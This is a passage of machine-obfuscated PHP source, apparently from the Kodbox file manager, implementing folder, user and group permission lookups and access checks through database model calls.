$ÄóÅÆ™ = $ã§çò ô[2133]; $ò“ã¸Öæ = array($ã§çò ô[193] => array($ã§çò ô[7], $æÄ¿ò¼Œ), $ã§çò ô[505] => $ã§çò ô[228]); $“§õ¹‡¥ = Model($ã§çò ô[873])->field($ÄóÅÆ™)->where($ò“ã¸Öæ)->select(); $äŸÑ Õ = array($ğ¢şÉÀÃ); foreach ($“§õ¹‡¥ as $ñŸÑÌ§û) { foreach ($Ùò¸Ëã­ as $¨ÖØËş) { $ç¨È’ŒÛ = $ã§çò ô[50] . $¨ÖØËş . $ã§çò ô[50]; $á¹°‹„Û = $ñŸÑÌ§û[$ã§çò ô[584]] . $ñŸÑÌ§û[$ã§çò ô[193]] . $ã§çò ô[50]; if (strstr($á¹°‹„Û, $ç¨È’ŒÛ)) { $äŸÑ Õ[] = $ñŸÑÌ§û[$ã§çò ô[193]]; break; } } } return $this->sourceListAuth($äŸÑ Õ); } private function sourceListAuth($ŠòêµŒî) { $‘›ŸñÎ =& $_SERVER[ìïæ“œî]; $—¼ÇÑœ = Model($‘›ŸñÎ[1394])->sourceListInfo($ŠòêµŒî, !0); $È™û®İğ = $this->sourceAuthSelect($ŠòêµŒî); $¾ÁŸ¹½Ô = array(); $‰‰Œ¢æç = array(); foreach ($—¼ÇÑœ as $†Ã·Áß) { unset($†Ã·Áß[$‘›ŸñÎ[529]]); unset($†Ã·Áß[$‘›ŸñÎ[527]]); unset($†Ã·Áß[$‘›ŸñÎ[487]]); unset($†Ã·Áß[$‘›ŸñÎ[90]]); $Š¿‹˜‰³ = $È™û®İğ[$†Ã·Áß[$‘›ŸñÎ[193]]]; if (!$Š¿‹˜‰³) { continue; } $†Ã·Áß[$‘›ŸñÎ[2134]] = $this->authTargetInfo($Š¿‹˜‰³); $†Ã·Áß[$‘›ŸñÎ[582]] = rtrim($†Ã·Áß[$‘›ŸñÎ[588]], $‘›ŸñÎ[8]) . $‘›ŸñÎ[8] . ltrim($†Ã·Áß[$‘›ŸñÎ[582]], $‘›ŸñÎ[8]); $¾ÁŸ¹½Ô[] = $†Ã·Áß; $£ı¾éÂµ = count(explode($‘›ŸñÎ[8], trim($†Ã·Áß[$‘›ŸñÎ[582]], $‘›ŸñÎ[8]))); $‰‰Œ¢æç[] = $£ı¾éÂµ + ($†Ã·Áß[$‘›ŸñÎ[33]] == $‘›ŸñÎ[78] ? 0 : 1000); } array_multisort($‰‰Œ¢æç, SORT_ASC, $¾ÁŸ¹½Ô); return $¾ÁŸ¹½Ô; } private function groupChidldAllRootSource($¸ˆ×Ò×ô) { $’îİò… =& $_SERVER[ìïæ“œî]; $°÷Š‰û = Model($’îİò…[2135])->groupChildrenAll($¸ˆ×Ò×ô); $æ ûë’¶ = array($’îİò…[192] => 0, $’îİò…[569] => array($’îİò…[7], $°÷Š‰û), $’îİò…[190] => SourceModel::TYPE_GROUP); $ıßıÌÙ = Model($’îİò…[873])->field($’îİò…[193])->where($æ ûë’¶)->select(); $ıßıÌÙ = array_to_keyvalue($ıßıÌÙ, $’îİò…[12], $’îİò…[193]); return $ıßıÌÙ; } private function authTargetInfo($ßê¢ÅÏŠ) { $´¶í‚Åõ =& $_SERVER[ìïæ“œî]; $ëÕİŒ´î = array(); $Ò«§Ì—¿ = array(); $İãš²“à = 2 << 25; foreach ($ßê¢ÅÏŠ as $Ú‰í†“ø) { $¤š¼ˆ°ê = Model($´¶í‚Åõ[571])->listData($Ú‰í†“ø[$´¶í‚Åõ[2054]]); if (!$¤š¼ˆ°ê) { continue; } if ($Ú‰í†“ø[$´¶í‚Åõ[190]] == SourceModel::TYPE_USER) { $ƒöşüÀ = Model($´¶í‚Åõ[577])->getInfoSimpleOuter($Ú‰í†“ø[$´¶í‚Åõ[569]]); if ($ƒöşüÀ[$´¶í‚Åõ[1747]] == $´¶í‚Åõ[1250]) { continue; } if ($ƒöşüÀ[$´¶í‚Åõ[1747]] == $´¶í‚Åõ[228]) { $ƒöşüÀ[$´¶í‚Åõ[32]] = LNG($´¶í‚Åõ[2136]); } } else { $ƒöşüÀ = Model($´¶í‚Åõ[585])->getInfoSimple($Ú‰í†“ø[$´¶í‚Åõ[569]]); } if (!$ƒöşüÀ) { continue; } $ƒöşüÀ[$´¶í‚Åõ[540]] = $¤š¼ˆ°ê; $ëÕİŒ´î[] = $ƒöşüÀ; $ÓÅÖ²¹Ë = 0; if ($Ú‰í†“ø[$´¶í‚Åõ[190]] == SourceModel::TYPE_GROUP) { $ÓÅÖ²¹Ë = $İãš²“à * 2; } if ($Ú‰í†“ø[$´¶í‚Åõ[190]] == SourceModel::TYPE_USER) { $ÓÅÖ²¹Ë = $İãš²“à; } if ($Ú‰í†“ø[$´¶í‚Åõ[190]] == SourceModel::TYPE_USER && $Ú‰í†“ø[$´¶í‚Åõ[569]] == $´¶í‚Åõ[228]) { $ÓÅÖ²¹Ë = 0; } $Ò«§Ì—¿[] = $¤š¼ˆ°ê[$´¶í‚Åõ[487]] + $ÓÅÖ²¹Ë; } array_multisort($Ò«§Ì—¿, SORT_DESC, $ëÕİŒ´î); return $ëÕİŒ´î; } public function getAllChildrenByUser($Ç›ö±‹˜, $å‘‹ÕÃ†) { $ÄÁ–ã˜² =& $_SERVER[ìïæ“œî]; $’á´Ş›İ = Model($ÄÁ–ã˜²[598])->getInfo($å‘‹ÕÃ†); if (!$å‘‹ÕÃ† || !$Ç›ö±‹˜ || !$’á´Ş›İ) { return array(); } $á«‹äç„ = Model($ÄÁ–ã˜²[1394])->sourceInfo($Ç›ö±‹˜); $äîæ– = array(); $‹êŒôì = 1; if ($á«‹äç„[$ÄÁ–ã˜²[192]] == $ÄÁ–ã˜²[228] && $á«‹äç„[$ÄÁ–ã˜²[569]] != $‹êŒôì && $this->groupContainUser($á«‹äç„[$ÄÁ–ã˜²[569]], $å‘‹ÕÃ†)) { foreach ($’á´Ş›İ[$ÄÁ–ã˜²[2137]] as $Úõ§»æÒ) { $„Ìƒªßç = Model($ÄÁ–ã˜²[585])->getInfo($Úõ§»æÒ[$ÄÁ–ã˜²[1946]]); $ùŞê¨ñ– = Model($ÄÁ–ã˜²[598])->getInfoSimpleOuter($å‘‹ÕÃ†); $ùŞê¨ñ–[$ÄÁ–ã˜²[540]] = $Úõ§»æÒ[$ÄÁ–ã˜²[487]]; if (Model($ÄÁ–ã˜²[571])->authCheckAction($Úõ§»æÒ[$ÄÁ–ã˜²[487]][$ÄÁ–ã˜²[487]], $ÄÁ–ã˜²[1967])) { continue; } $­¡Ã„ı = array($ÄÁ–ã˜²[32] => $ÄÁ–ã˜²[1270] . $„Ìƒªßç[$ÄÁ–ã˜²[32]], $ÄÁ–ã˜²[193] => $„Ìƒªßç[$ÄÁ–ã˜²[90]][$ÄÁ–ã˜²[193]], $ÄÁ–ã˜²[87] => KodIO::make($„Ìƒªßç[$ÄÁ–ã˜²[90]][$ÄÁ–ã˜²[193]]), $ÄÁ–ã˜²[192] => $ÄÁ–ã˜²[228], $ÄÁ–ã˜²[190] => $ÄÁ–ã˜²[578], $ÄÁ–ã˜²[33] => $ÄÁ–ã˜²[616], $ÄÁ–ã˜²[582] => $„Ìƒªßç[$ÄÁ–ã˜²[589]], $ÄÁ–ã˜²[1946] => $„Ìƒªßç[$ÄÁ–ã˜²[1946]], $ÄÁ–ã˜²[586] => $„Ìƒªßç[$ÄÁ–ã˜²[192]], $ÄÁ–ã˜²[2134] => array($ùŞê¨ñ–)); $äîæ–[$­¡Ã„ı[$ÄÁ–ã˜²[193]]] = $­¡Ã„ı; } } $±ÇòÃé® = array(); $ƒ÷ø©»æ = $this->getAllChildren($Ç›ö±‹˜); foreach ($ƒ÷ø©»æ as $Âßè”…) { $Ï–úŠ“ = !1; foreach ($Âßè”…[$ÄÁ–ã˜²[2134]] as $„ŞèöÎ‰) { if ($„ŞèöÎ‰[$ÄÁ–ã˜²[1747]]) { if ($„ŞèöÎ‰[$ÄÁ–ã˜²[1747]] == $å‘‹ÕÃ†) { $Ï–úŠ“ = !0; break; } } if ($„ŞèöÎ‰[$ÄÁ–ã˜²[1946]]) { if ($this->groupContainUser($„ŞèöÎ‰[$ÄÁ–ã˜²[1946]], $å‘‹ÕÃ†)) { $Ï–úŠ“ = !0; break; } } } if ($Ï–úŠ“) { $±ÇòÃé®[] = $Âßè”…; } $ŒÁàï— = $Âßè”…[$ÄÁ–ã˜²[193]]; if (isset($äîæ–[$ŒÁàï—])) { $Âßè”…[$ÄÁ–ã˜²[2134]][] = $äîæ–[$ŒÁàï—][0]; $äîæ–[$ŒÁàï—] = !1; } } $äîæ– = array_filter(array_values($äîæ–)); $±ÇòÃé® = array_merge($äîæ–, $±ÇòÃé®); return $±ÇòÃé®; } public function setAllChildrenByUser($›µ¸üá÷, $ÓµóÛÛÄ, $µˆõéíÊ) { $ª±Ò‡Üñ =& $_SERVER[ìïæ“œî]; $ÉÜ½ï­Å = $this->getAllChildrenByUser($›µ¸üá÷, $ÓµóÛÛÄ); if (!$µˆõéíÊ || !$ÉÜ½ï­Å) { return !1; } foreach ($ÉÜ½ï­Å as $şÍÛ…€Ì) { $”Óèª²ğ = array(); foreach ($şÍÛ…€Ì[$ª±Ò‡Üñ[2134]] as $ ­äçÉü) { $û„†Šœ˜ = $ ­äçÉü[$ª±Ò‡Üñ[540]]; $Íì¢ÕÒ = $ ­äçÉü[$ª±Ò‡Üñ[1747]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $äĞåÉµÓ = $ ­äçÉü[$ª±Ò‡Üñ[1747]] ? $ ­äçÉü[$ª±Ò‡Üñ[1747]] : $ ­äçÉü[$ª±Ò‡Üñ[1946]]; if ($ ­äçÉü[$ª±Ò‡Üñ[1747]] && $ ­äçÉü[$ª±Ò‡Üñ[1747]] == $ÓµóÛÛÄ) { continue; } $”Óèª²ğ[] = array($ª±Ò‡Üñ[193] => $şÍÛ…€Ì[$ª±Ò‡Üñ[193]], $ª±Ò‡Üñ[190] => $Íì¢ÕÒ, $ª±Ò‡Üñ[569] => intval($äĞåÉµÓ), $ª±Ò‡Üñ[2054] => isset($û„†Šœ˜[$ª±Ò‡Üñ[475]]) ? intval($û„†Šœ˜[$ª±Ò‡Üñ[475]]) : 0, $ª±Ò‡Üñ[2114] => isset($û„†Šœ˜[$ª±Ò‡Üñ[2114]]) ? intval($û„†Šœ˜[$ª±Ò‡Üñ[2114]]) : -1); } $”Óèª²ğ[] = array($ª±Ò‡Üñ[193] => $şÍÛ…€Ì[$ª±Ò‡Üñ[193]], $ª±Ò‡Üñ[190] => SourceModel::TYPE_USER, $ª±Ò‡Üñ[569] => intval($ÓµóÛÛÄ), $ª±Ò‡Üñ[2054] => intval($µˆõéíÊ), $ª±Ò‡Üñ[2114] => -1); $this->where(array($ª±Ò‡Üñ[491] => $şÍÛ…€Ì[$ª±Ò‡Üñ[193]]))->delete(); $this->addAll($”Óèª²ğ); } return !0; } public function get($ä¨šàš´) { $ªóÒç©ø = $this->getSourceList(array($ä¨šàš´), !0); return $ªóÒç©ø[0]; } public function getSourceList($àĞæ‘½í, $²æ´œ…Ø = false, $€Ô¥ïªÀ = false) { $ÇÉ¯”¸Ê =& $_SERVER[ìïæ“œî]; if (!$àĞæ‘½í) { return array(); } $ óÜ½Õ¥ = Model($ÇÉ¯”¸Ê[1394]); if (!$²æ´œ…Ø && count($àĞæ‘½í) == 1) { $²æ´œ…Ø = array(); $²æ´œ…Ø[$àĞæ‘½í[0]] = $ óÜ½Õ¥->sourceInfo($àĞæ‘½í[0]); } if (!$²æ´œ…Ø) { $µË­ŞŸ¸ = array($ÇÉ¯”¸Ê[491] => array($ÇÉ¯”¸Ê[492], $àĞæ‘½í)); $²æ´œ…Ø = $ óÜ½Õ¥->field($ÇÉ¯”¸Ê[2138])->where($µË­ŞŸ¸)->select(); $²æ´œ…Ø = array_to_keyvalue($²æ´œ…Ø, $ÇÉ¯”¸Ê[193]); } $Œ×Ÿì”ø = $àĞæ‘½í; foreach ($²æ´œ…Ø as $µ´àÉÜ => $›ë§î¡) { $ëÕÍç§¬ = $ óÜ½Õ¥->parentLevelArray($›ë§î¡[$ÇÉ¯”¸Ê[584]]); $Œ×Ÿì”ø = array_merge($Œ×Ÿì”ø, array($µ´àÉÜ), array_reverse($ëÕÍç§¬)); } $Œ×Ÿì”ø = array_values(array_unique($Œ×Ÿì”ø)); if (!$Œ×Ÿì”ø) { return array(); } $¦º¯ÑÌæ = $this->sourceAuthSelect($Œ×Ÿì”ø); $äˆŒó×ü = array(); foreach ($Œ×Ÿì”ø as $¡Ù¦¥¶) { if (isset($¦º¯ÑÌæ[$¡Ù¦¥¶])) { $äˆŒó×ü[$¡Ù¦¥¶] = $¦º¯ÑÌæ[$¡Ù¦¥¶]; } } $ãîÔàÄ§ = $this->userIsRoot($€Ô¥ïªÀ); $ªº±šåÕ = AuthModel::authAll(); $ó‚ê¼›ò = array($ÇÉ¯”¸Ê[488] => $ªº±šåÕ, $ÇÉ¯”¸Ê[2139] => array($ÇÉ¯”¸Ê[493] => 0, $ÇÉ¯”¸Ê[1952] => $ªº±šåÕ, $ÇÉ¯”¸Ê[494] => LNG($ÇÉ¯”¸Ê[2140]), $ÇÉ¯”¸Ê[1969] => $ÇÉ¯”¸Ê[2141])); $Ö“©‘Ü = array(); foreach ($²æ´œ…Ø as $¡Ù¦¥¶ => $Áæúé§ì) { if ($ãîÔàÄ§ && $GLOBALS[$ÇÉ¯”¸Ê[6]][$ÇÉ¯”¸Ê[1965]]) { $Ö“©‘Ü[$¡Ù¦¥¶] = $ó‚ê¼›ò; continue; } $Ö“©‘Ü[$¡Ù¦¥¶] = $this->makeSourceAuth($Áæúé§ì, $äˆŒó×ü, $€Ô¥ïªÀ); } return $Ö“©‘Ü; } public function authDeepCheck($áÀ’±ş, $î”šèÒó = false) { $èâ¾À±œ =& $_SERVER[ìïæ“œî]; $î”šèÒó = $î”šèÒó ? $î”šèÒó : USER_ID; $î÷ÄÎß÷ = $this->makeAuthDeep($î”šèÒó); if (!in_array($áÀ’±ş, $î÷ÄÎß÷[$èâ¾À±œ[2142]])) { return !1; } $ ‚ÎÅÍˆ = array(); foreach ($î÷ÄÎß÷[$èâ¾À±œ[2143]] as $öÈÄ¾  => $©ùúåõÑ) { if (!in_array($áÀ’±ş, $©ùúåõÑ)) { continue; } $ ‚ÎÅÍˆ[] = $öÈÄ¾ ; } if (!$ ‚ÎÅÍˆ) { return !1; } $¼Âı¤µ = $ ‚ÎÅÍˆ ? $ ‚ÎÅÍˆ[0] : $áÀ’±ş; return array($èâ¾À±œ[488] => -1, $èâ¾À±œ[540] => array($èâ¾À±œ[493] => $èâ¾À±œ[1250], $èâ¾À±œ[1952] => $èâ¾À±œ[228], $èâ¾À±œ[494] => LNG($èâ¾À±œ[2144]), $èâ¾À±œ[1969] => $èâ¾À±œ[2145]), $èâ¾À±œ[2146] => LNG($èâ¾À±œ[2147]), $èâ¾À±œ[2148] => $this->sourceAuthInfo($¼Âı¤µ)); } protected function makeAuthDeep($Ñ¬«äˆ = false) { $Ú˜«ÒèÑ =& $_SERVER[ìïæ“œî]; static $’ª•£€ = array(); $Ñ¬«äˆ = $Ñ¬«äˆ ? $Ñ¬«äˆ : USER_ID; if (isset($’ª•£€[$Ñ¬«äˆ])) { return $’ª•£€[$Ñ¬«äˆ]; } $óäšàŠ = Model($Ú˜«ÒèÑ[2149])->listData(); $¦šÃ•áÜ = array(); foreach ($óäšàŠ as $ë•‡±×) { if ($ë•‡±×[$Ú˜«ÒèÑ[487]] == 0 && $ë•‡±×[$Ú˜«ÒèÑ[1968]] == $Ú˜«ÒèÑ[91]) { $¦šÃ•áÜ[] = $ë•‡±×[$Ú˜«ÒèÑ[475]]; } } $Ï…‡Œä = $this->userGroupParents($Ñ¬«äˆ); $º›ï·¨Ã = array($Ú˜«ÒèÑ[190] => SourceModel::TYPE_USER, $Ú˜«ÒèÑ[569] => $Ñ¬«äˆ); if ($Ï…‡Œä) { $º›ï·¨Ã = array(array($Ú˜«ÒèÑ[190] => SourceModel::TYPE_USER, $Ú˜«ÒèÑ[569] => $Ñ¬«äˆ), array($Ú˜«ÒèÑ[190] => SourceModel::TYPE_GROUP, $Ú˜«ÒèÑ[569] => array($Ú˜«ÒèÑ[492], $Ï…‡Œä)), $Ú˜«ÒèÑ[1055] => $Ú˜«ÒèÑ[2048]); } $ë´Ğ„Ùİ = $this->field($Ú˜«ÒèÑ[2150])->where($º›ï·¨Ã)->select(); $¯™ÂÅö» = array(); $¿’¾­Ã’ = array_to_keyvalue_group($ë´Ğ„Ùİ, $Ú˜«ÒèÑ[193]); foreach ($¿’¾­Ã’ as $ÄÒÇ§»¦ => $ÎÁø‘ê) { $ê¢ÕûÂ® = $this->authArrayCheck($ÎÁø‘ê, $Ñ¬«äˆ); if ($ê¢ÕûÂ®[$Ú˜«ÒèÑ[488]] > 0) { $¯™ÂÅö»[] = $ÄÒÇ§»¦ . $Ú˜«ÒèÑ[12]; } } if ($Ï…‡Œä) { $Íãú¥©â = Model($Ú˜«ÒèÑ[585]); foreach ($Ï…‡Œä as $¨ÑßÌ¸) { $™Ÿşåû¨ = $Íãú¥©â->getInfo($¨ÑßÌ¸); if (!$™Ÿşåû¨ || !is_array($™Ÿşåû¨[$Ú˜«ÒèÑ[90]])) { continue; } $¯™ÂÅö»[] = $™Ÿşåû¨[$Ú˜«ÒèÑ[90]][$Ú˜«ÒèÑ[193]]; } } $›Òˆˆªı = array(); $èİÊ°¾´ = $Ï…‡Œä; $ÂÙãºŸï = Model($Ú˜«ÒèÑ[1394]); $Íãú¥©â = Model($Ú˜«ÒèÑ[585]); $ÅÍŸ…àÖ = array(); $ªµ°®² = array(); $ÒåËÉûˆ = array(); $àÃßÉÎ· = array(); if ($¯™ÂÅö») { $Ï²äú°Á = $ÂÙãºŸï->where(array($Ú˜«ÒèÑ[193] => array($Ú˜«ÒèÑ[492], $¯™ÂÅö»)))->select(); foreach ($Ï²äú°Á as $ŸƒÄ¥¦) { $ÅóÏøÂ = $ÂÙãºŸï->parentLevelArray($ŸƒÄ¥¦[$Ú˜«ÒèÑ[584]]); $›Òˆˆªı = array_merge($›Òˆˆªı, $ÅóÏøÂ); $èİÊ°¾´[] = $ŸƒÄ¥¦[$Ú˜«ÒèÑ[569]]; $ÅÍŸ…àÖ[$ŸƒÄ¥¦[$Ú˜«ÒèÑ[193]]] = $ÅóÏøÂ; $ªµ°®²[$ŸƒÄ¥¦[$Ú˜«ÒèÑ[193]]] = $ŸƒÄ¥¦[$Ú˜«ÒèÑ[569]]; } } $èİÊ°¾´ = array_values(array_unique($èİÊ°¾´)); $ ùª¯Ëï = $èİÊ°¾´; foreach ($ ùª¯Ëï as $¨ÑßÌ¸) { $™Ÿşåû¨ = $Íãú¥©â->getInfo($¨ÑßÌ¸); $ÅóÏøÂ = $ÂÙãºŸï->parentLevelArray($™Ÿşåû¨[$Ú˜«ÒèÑ[584]]); $èİÊ°¾´ = array_merge($èİÊ°¾´, $ÅóÏøÂ); } $èİÊ°¾´ = array_values(array_unique($èİÊ°¾´)); foreach ($èİÊ°¾´ as $¨ÑßÌ¸) { $™Ÿşåû¨ = $Íãú¥©â->getInfo($¨ÑßÌ¸); $›Òˆˆªı[] = $™Ÿşåû¨[$Ú˜«ÒèÑ[90]][$Ú˜«ÒèÑ[193]]; $ÒåËÉûˆ[$¨ÑßÌ¸] = $™Ÿşåû¨[$Ú˜«ÒèÑ[90]][$Ú˜«ÒèÑ[193]]; $àÃßÉÎ·[$¨ÑßÌ¸] = $ÂÙãºŸï->parentLevelArray($™Ÿşåû¨[$Ú˜«ÒèÑ[584]]); } foreach ($ÅÍŸ…àÖ as $…¤¸½Î => $–ÖÄúÕ) { $Úóûò– = $ªµ°®²[$…¤¸½Î]; if (!$Úóûò– || !$ÒåËÉûˆ[$Úóûò–]) { continue; } $­‡‡Ò“Œ = array(); foreach ($àÃßÉÎ·[$Úóûò–] as $¨ÑßÌ¸) { $­‡‡Ò“Œ[] = $ÒåËÉûˆ[$¨ÑßÌ¸]; } $ÅÍŸ…àÖ[$…¤¸½Î] = array_merge($­‡‡Ò“Œ, $–ÖÄúÕ); } $›Òˆˆªı = array_values(array_unique($›Òˆˆªı)); $õ·ó„ìí = array($Ú˜«ÒèÑ[2142] => $›Òˆˆªı, $Ú˜«ÒèÑ[2143] => $ÅÍŸ…àÖ); $’ª•£€[$Ñ¬«äˆ] = $õ·ó„ìí; return $õ·ó„ìí; } private function makeSourceAuth($õÔçÛ£¹, $ı£¤¼‰ş, $¹ˆ‰ÒÃ¸ = false) { $¡ƒ¢åÄ =& $_SERVER[ìïæ“œî]; $Ú¸¸Ş« = $¡ƒ¢åÄ[91]; $ŠŒøŞ£° = $õÔçÛ£¹[$¡ƒ¢åÄ[569]]; $Ãğ£œ = $õÔçÛ£¹[$¡ƒ¢åÄ[190]] == SourceModel::TYPE_GROUP; $÷“Ú•¦× = $Ãğ£œ ? $this->groupRootAuth($ŠŒøŞ£°, $¹ˆ‰ÒÃ¸) : !1; if ($÷“Ú•¦× && Model($¡ƒ¢åÄ[571])->authCheckAction($÷“Ú•¦×[$¡ƒ¢åÄ[487]], $¡ƒ¢åÄ[1967])) { return $this->groupAuthInfo($÷“Ú•¦×, $ŠŒøŞ£°); } $µ¨„Û¢ = Model($¡ƒ¢åÄ[1394])->parentLevelArray($õÔçÛ£¹[$¡ƒ¢åÄ[584]]); $µ¨„Û¢ = array_merge(array($õÔçÛ£¹[$¡ƒ¢åÄ[193]]), array_reverse($µ¨„Û¢)); $¸çÑÑ¢Ò = !1; foreach ($µ¨„Û¢ as $¸Û‘ïëª) { if (!isset($ı£¤¼‰ş[$¸Û‘ïëª])) { continue; } $ŞŸ°ı¤ş = $this->authMake($ı£¤¼‰ş[$¸Û‘ïëª], $¹ˆ‰ÒÃ¸); if ($ŞŸ°ı¤ş[$¡ƒ¢åÄ[540]]) { $¸çÑÑ¢Ò = $ŞŸ°ı¤ş; break; } } if (!$Ãğ£œ) { return $¸çÑÑ¢Ò; } if (!$¸çÑÑ¢Ò && $÷“Ú•¦×) { $¸çÑÑ¢Ò = $this->groupAuthInfo($÷“Ú•¦×, $ŠŒøŞ£°); } if (!$¸çÑÑ¢Ò) { $¡¦‚éÂ = Model($¡ƒ¢åÄ[585])->getInfo($ŠŒøŞ£°); $§Çı†ÜÓ = explode($¡ƒ¢åÄ[50], trim($¡¦‚éÂ[$¡ƒ¢åÄ[584]], $¡ƒ¢åÄ[50])); $§Çı†ÜÓ = array_reverse($§Çı†ÜÓ); foreach ($§Çı†ÜÓ as $Ñ¿ÉÂ‹¶) { if ($Ñ¿ÉÂ‹¶ == $¡ƒ¢åÄ[228] || $Ñ¿ÉÂ‹¶ == $Ú¸¸Ş«) { continue; } $óªÉ»ë– = $this->groupRootAuth($Ñ¿ÉÂ‹¶, $¹ˆ‰ÒÃ¸); if (!$óªÉ»ë–) { continue; } $¸çÑÑ¢Ò = $this->groupAuthInfo($óªÉ»ë–, $Ñ¿ÉÂ‹¶); break; } } if (!$¸çÑÑ¢Ò || $¸çÑÑ¢Ò[$¡ƒ¢åÄ[488]] <= 0) { $¦¬ĞÜñÉ = $this->authDeepCheck($õÔçÛ£¹[$¡ƒ¢åÄ[193]], $¹ˆ‰ÒÃ¸); if ($¦¬ĞÜñÉ) { $¸çÑÑ¢Ò = $¦¬ĞÜñÉ; } } return $¸çÑÑ¢Ò; } private function userIsRoot($òó©­ó¿ = false) { $Ä®éªÈä =& $_SERVER[ìïæ“œî]; if (!$òó©­ó¿ && KodUser::isRoot()) { return !0; } $î‡»“¨æ = Model($Ä®éªÈä[598])->getInfo($òó©­ó¿); $¯ä‹Ä’ = Model($Ä®éªÈä[2151])->listData($î‡»“¨æ[$Ä®éªÈä[2152]]); if ($¯ä‹Ä’ && $¯ä‹Ä’[$Ä®éªÈä[575]][$Ä®éªÈä[2153]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ô´ı¤ı) { $‡—ğ§¦è =& $_SERVER[ìïæ“œî]; $¶î¸æôÂ = Model($‡—ğ§¦è[1394]); $µÓ¸¼¡ = $¶î¸æôÂ->sourceInfo($ô´ı¤ı); if (!$µÓ¸¼¡) { return !1; } $¶î¸æôÂ->groupPathDisplay($µÓ¸¼¡); $Å´Ùìú = array($µÓ¸¼¡); $Å´Ùìú = $¶î¸æôÂ->_listAppendPath($Å´Ùìú); $µÓ¸¼¡ = $Å´Ùìú[0]; $Ò®¬ÓÏ‘ = $µÓ¸¼¡[$‡—ğ§¦è[582]]; if (isset($µÓ¸¼¡[$‡—ğ§¦è[590]])) { $ñÚûà™’ = explode($‡—ğ§¦è[8], trim($µÓ¸¼¡[$‡—ğ§¦è[582]], $‡—ğ§¦è[8])); array_shift($ñÚûà™’); $Ò®¬ÓÏ‘ = $µÓ¸¼¡[$‡—ğ§¦è[588]] . $‡—ğ§¦è[2154] . implode($‡—ğ§¦è[8], $ñÚûà™’); } return array($‡—ğ§¦è[494] => $µÓ¸¼¡[$‡—ğ§¦è[32]], $‡—ğ§¦è[87] => KodIO::make($µÓ¸¼¡[$‡—ğ§¦è[193]]), $‡—ğ§¦è[2155] => $Ò®¬ÓÏ‘); } private function groupAuthInfo($³î´©Áƒ, $È€øŞ£ñ) { $óøÏÇúá =& $_SERVER[ìïæ“œî]; $¸™³—ã  = Model($óøÏÇúá[585])->getInfo($È€øŞ£ñ); return array($óøÏÇúá[2156] => intval($³î´©Áƒ[$óøÏÇúá[487]]), $óøÏÇúá[2139] => $³î´©Áƒ, $óøÏÇúá[2157] => LNG($óøÏÇúá[2158]), $óøÏÇúá[2148] => array($óøÏÇúá[494] => $¸™³—ã [$óøÏÇúá[32]], $óøÏÇúá[87] => KodIO::make($¸™³—ã [$óøÏÇúá[90]][$óøÏÇúá[193]]), $óøÏÇúá[2155] => $¸™³—ã [$óøÏÇúá[589]])); } protected function groupRootAuth($¼²ùË“Š, $—……°Û = false) { $œ¨ÓŞİ =& $_SERVER[ìïæ“œî]; $—……°Û = $—……°Û ? $—……°Û : USER_ID; $¥²à¸Ì´ = $—……°Û . $œ¨ÓŞİ[2159] . $¼²ùË“Š; static $ÚÈ‰Ø¬  = array(); if (isset($ÚÈ‰Ø¬ [$¥²à¸Ì´])) { return $ÚÈ‰Ø¬ [$¥²à¸Ì´]; } $¬“¬îÕ¯ = Model($œ¨ÓŞİ[585])->getInfo($¼²ùË“Š); $ÊîµÃ¾ = $this->userGroupList($—……°Û); $«È¯Õèù = isset($ÊîµÃ¾[$¼²ùË“Š]) ? $ÊîµÃ¾[$¼²ùË“Š][$œ¨ÓŞİ[487]] : !1; if ($«È¯Õèù && Model($œ¨ÓŞİ[571])->authCheckAction($«È¯Õèù[$œ¨ÓŞİ[487]], $œ¨ÓŞİ[1967])) { $ÚÈ‰Ø¬ [$¥²à¸Ì´] = $«È¯Õèù; return $«È¯Õèù; } $†›˜åêâ = $this->sourceAuthSelect($¬“¬îÕ¯[$œ¨ÓŞİ[90]][$œ¨ÓŞİ[193]]); $®¤øÒ¤½ = $†›˜åêâ ? $this->authMake($†›˜åêâ, $—……°Û) : !1; $…ğ‚’ë† = $®¤øÒ¤½ ? $®¤øÒ¤½[$œ¨ÓŞİ[540]] : !1; $ÚÈ‰Ø¬ [$¥²à¸Ì´] = $…ğ‚’ë† ? $…ğ‚’ë† : $«È¯Õèù; return $ÚÈ‰Ø¬ [$¥²à¸Ì´]; } public function authOwnerApply($†íàÓ•ª) { $Åøû÷å =& $_SERVER[ìïæ“œî]; if (empty($†íàÓ•ª[$Åøû÷å[487]]) || isset($†íàÓ•ª[$Åøû÷å[2160]]) && $†íàÓ•ª[$Åøû÷å[2160]]) { return $†íàÓ•ª; } if (AuthModel::authCheckRoot($†íàÓ•ª[$Åøû÷å[487]][$Åøû÷å[488]])) { return $†íàÓ•ª; } $Øİ“Œ° = Model($Åøû÷å[1394])->parentLevelArray($†íàÓ•ª[$Åøû÷å[584]]); $Øİ“Œ° = array_merge(array($†íàÓ•ª[$Åøû÷å[193]]), array_reverse($Øİ“Œ°)); $±ÁÜÌÃ = $this->sourceAuthSelect($Øİ“Œ°); $‰µÅÉúÂ = array(); $…êÆÄ– = array(); foreach ($±ÁÜÌÃ as $ƒ¨Å· => $İä¤É‡˜) { $Ãò’¬üÏ = $this->authFolderOwnerUser($İä¤É‡˜); $‰µÅÉúÂ[$ƒ¨Å·] = $Ãò’¬üÏ; $…êÆÄ– = array_merge($…êÆÄ–, $Ãò’¬üÏ[$Åøû÷å[662]]); if ($Ãò’¬üÏ[$Åøû÷å[2161]]) { break; } } if (count($…êÆÄ–) == 0) { $…êÆÄ– = $this->authFolderOwnerGroup($†íàÓ•ª[$Åøû÷å[569]]); } $…êÆÄ– = array_unique($…êÆÄ–); if (AuthModel::authCheckRoot($†íàÓ•ª[$Åøû÷å[487]][$Åøû÷å[488]])) { $…êÆÄ–[] = USER_ID; } $†íàÓ•ª[$Åøû÷å[487]][$Åøû÷å[2162]] = Model($Åøû÷å[577])->userListInfo($…êÆÄ–); return $†íàÓ•ª; } private function authFolderOwnerGroup($€ø Õ“Ä) { $²ıü‰÷É =& $_SERVER[ìïæ“œî]; $ß´ÒÓ°Ö = Model($²ıü‰÷É[2040])->where(array($²ıü‰÷É[1946] => $€ø Õ“Ä))->select(); $ÀÍŞçµ = array(); if (!$ß´ÒÓ°Ö) { return $ÀÍŞçµ; } foreach ($ß´ÒÓ°Ö as $®ë¦ƒ¸) { $‚Á†è¤½ = $this->authInfo($®ë¦ƒ¸); if (AuthModel::authCheckRoot($‚Á†è¤½[$²ıü‰÷É[487]])) { $ÀÍŞçµ[] = $®ë¦ƒ¸[$²ıü‰÷É[1747]]; } } return 